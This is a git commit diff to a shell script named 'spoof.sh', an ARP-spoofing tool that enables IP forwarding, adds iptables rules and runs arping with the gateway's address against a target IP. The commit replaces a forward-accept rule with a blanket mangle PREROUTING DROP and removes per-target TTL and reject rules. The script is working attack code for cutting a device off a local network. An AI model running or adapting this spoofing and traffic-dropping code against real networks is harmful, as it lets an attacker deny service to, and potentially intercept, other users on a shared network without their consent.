d04b1adc429bdaf9d51c3e6bc6290815193ae126
rff ald <117867334+xiv3r@users.noreply.github.com>
2025-10-14 15:15:58 +0800

    fix

--- spoof.sh
+++ spoof.sh
@@ -2,7 +2,7 @@
 
 # Enable ip forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
-iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -t mangle -A PREROUTING -j DROP
 
 # Create cleanup script
 cat > /bin/spoofer-stop << EOF
@@ -10,7 +10,6 @@ cat > /bin/spoofer-stop << EOF
 
 # flush prerouting tables 
 iptables -t mangle -F PREROUTING
-iptables -F FORWARD 
 
 # Kill arping processes
 pkill -f arping
@@ -185,8 +184,6 @@ echo
         if [[ -n "$target" ]]; then
             echo " "
             echo "Blocking the target IP: $target"
-            iptables -t mangle -A FORWARD -s "$target" -j TTL --ttl-set 0
-            iptables -A FORWARD -s "$target" -p tcp -j REJECT --reject-with tcp-reset
           ( arping -b -A -i "$INTERFACE" -S "$GATEWAY" "$target" >/dev/null 2>&1 ) &
             pid1=$!
             pids+=($pid1)
